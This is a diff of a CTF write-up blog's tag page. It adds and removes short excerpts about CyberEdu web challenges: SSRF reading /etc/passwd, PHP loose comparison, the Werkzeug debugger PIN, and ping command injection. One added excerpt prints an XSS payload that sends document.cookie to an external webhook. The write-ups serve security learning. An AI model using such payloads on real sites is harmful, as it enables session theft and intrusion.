@@ -137,6 +137,99 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu ultra-crawl Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Here is your favorite proxy for crawling minimal websites.
+Identifying the vulnerabilities This looks like some sort of crawler that mirrors the given page’s response. After a pipedream webhook, looks like they’re using Python-urllib/3.6.
+Some classic SSRF, we can just feed this crawler a file:///etc/passwd and surprise, it works!
+Now we just need to figure our where our flag is - if we input a wrong file location, we get a 500. From /etc/passwd, looks like we have a /home/ctf user, so let’s look for the flag there.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-26 00:00:00 +0000 UTC'>January 26, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu ultra-crawl Writeup" href="https://irinasusca.github.io/writeup-blog/posts/ultracrawl-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu the-code Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Look, the code is there. Enjoy.
+Identifying the vulnerabilities More php fun.
+We have two arguments here, start (actually start the challenge) and arg. Then, after blacklisting the following in arg: php &gt; &amp; $ :, they execute shell_exec(&#34;find /tmp -iname &#34;.escapeshellcmd($_GET[&#39;arg&#39;])).
+That means they return the toupper version of what that command returns, which is b64 encoded, and more exactly the result of the files that are named like arg in /tmp.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-25 00:00:00 +0000 UTC'>January 25, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu the-code Writeup" href="https://irinasusca.github.io/writeup-blog/posts/thecode-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu puzzled Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview How puzzled can you get with php?
+I really didn’t feel like doing php challenges but I did it anyways.
+Identifying the vulnerabilities We get a php source file with what looks like login. If we don’t provide a pass, the source gets leaked.
+if (isset($_GET[&#39;pass&#39;])){ $pass = generateRandomString(95); $user_input = json_decode($_GET[&#39;pass&#39;]); if ($pass != $user_input-&gt;pass) { header(&#39;HTTP/1.0 403 Forbidden&#39;); exit; } They generate a random 95 letter long password, decode the json of our pass, and hit us with a 403 if the password isn’t correct. But the comparison is done with !=, not !==. For example, 5!=&#34;5&#34; would return false, while 5!==&#34;5&#34; would return true.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-18 00:00:00 +0000 UTC'>January 18, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu puzzled Writeup" href="https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu js-magic Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview Javascript Obfuscation 101.
+Already sounds bad, and I just noticed the Cryptography tag, but let’s give it a go. We’re only given a chall_clean.js file, and no instance.
+Identifying the vulnerabilities I tried running it in an online compiler, but it required the window component, so I locally added an index.html buddy for it and ran them together, and what it did was open a lot of porn tabs.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-15 00:00:00 +0000 UTC'>January 15, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu js-magic Writeup" href="https://irinasusca.github.io/writeup-blog/posts/jsmagic-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu rundown Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview A rundown, informally known as a pickle or the hotbox, is a situation in the game of baseball that occurs when the baserunner is stranded between two bases, also known as no-man’s land, and is in jeopardy of being tagged out.&#34; … if you stopped in the first part of the definition you are one of ours.
+This is EXACTLY like slightly-broken (you could take a look at it, it’s short), except the pin things are actually being used!
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-15 00:00:00 +0000 UTC'>January 15, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu rundown Writeup" href="https://irinasusca.github.io/writeup-blog/posts/rundown-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu slightly-broken Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview For this one, only contact admins for socialising with them. Do not contact them for errors at this challenge.
+Identifying the vulnerabilities We bump into some errors, but look at this section of a response:
+This is part of the Flask/Werkzeug’s interactive debugger, and we see it because of the error.
+To execute a command, we need the params __debugger__: &#39;yes&#39;, cmd: &#39;pinauth&#39;, pin: pin, s: SECRET as json. In a GET request, because Workzeug uses GETs not POST.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu slightly-broken Writeup" href="https://irinasusca.github.io/writeup-blog/posts/slightlybroken-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">CyberEdu downloader-v1 Writeup
     </h2>
   </header>
@@ -147,6 +240,25 @@ Identifying the vulnerabilities In the GET request, we have a comment pointing u
   </div>
   <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
   <a class="entry-link" aria-label="post link to CyberEdu downloader-v1 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CyberEdu manual-review Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge overview For any coffe machine issue please open a ticket at the IT support department.
+Flag format: ctf{sha256}
+Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
+Identifying the vulnerabilities This look familiar?
+Alright, so XSS is confirmed, and we have two types of cookies.
+First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
+I sent a &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu manual-review Writeup" href="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -180,65 +292,12 @@ Since the flag is located in a “temporary folder”, my first guess was /tmp/f
   <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
   <a class="entry-link" aria-label="post link to CyberEdu file-crawler Writeup" href="https://irinasusca.github.io/writeup-blog/posts/filecrawler-writeup/"></a>
 </article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu ping-station Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge overview Just another ping service to audit.
-We get an app(1).py file to look at.
-from flask import Flask, render_template, url_for, request, redirect import subprocess import re import string app = Flask(__name__) def is_valid_ip(ip): ipv = re.match(r&#34;^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$&#34;,ip) return bool(ipv) @app.route(&#39;/&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;]) def index(): if request.method == &#39;POST&#39;: ip = request.form[&#39;content&#39;] if (is_valid_ip(ip)==True): for i in range(0,2): return &#39;&lt;pre&gt;&#39;&#43;subprocess.check_output(&#34;ping -c 4 &#34;&#43;ip,shell=True).decode()&#43;&#39;&lt;/pre&gt;&#39; break else: return&#34;That&#39;s not a valid IP&#34; else: return render_template(&#39;index.html&#39;) if __name__ == &#34;__main__&#34;: app.run(host = &#34;0.0.0.0&#34;) Identifying the vulnerabilities Looking at that &#34;ping -c 4 &#34;&#43;ip,shell=True), if we manage to smuggle a command past this is_valid_ip function, it will get executed.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu ping-station Writeup" href="https://irinasusca.github.io/writeup-blog/posts/pingstation-writeup/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu jargon Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
-Identifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we’re given some hints:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-09 00:00:00 +0000 UTC'>January 9, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu jargon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Serialization and Deserialization
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Why I decided to get more into this subject because of the challenge jargon. I was struggling with AIs and it was really getting on my nerves, because I felt I didn’t really understand what was going on. So I decided to write a little article about this, to make myself fully grasp serialization, deserialization and the subset of vulnerabilities that may come with them. So, let’s get into it.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-08 00:00:00 +0000 UTC'>January 8, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to Serialization and Deserialization" href="https://irinasusca.github.io/writeup-blog/posts/serialization/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu reccon Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge overview I heard you like memes, so we had a surprise for you. Enjoy !!
-Today is a big day. Finally solving a non-pwn challenge! Let’s see if I can still remember how burpsuite works.
-Identifying the vulnerabilities First I ran ffuf -u http://34.159.240.221:31548/FUZZ -w /usr/share/wordlists/dirb/common.txt, but only found .hta, .htaccess, .htpasswd and index.php.
-This is all. I ffufed for /images_FUZZ too, but nothing.
-I did exiftool, strings, looked at it in hex, steghide, stegseek, just about everything.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-07 00:00:00 +0000 UTC'>January 7, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu reccon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/reccon-writeup/"></a>
-</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="next" href="https://irinasusca.github.io/writeup-blog/tags/web/page/2/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
     </main>
     
 <footer class="footer">
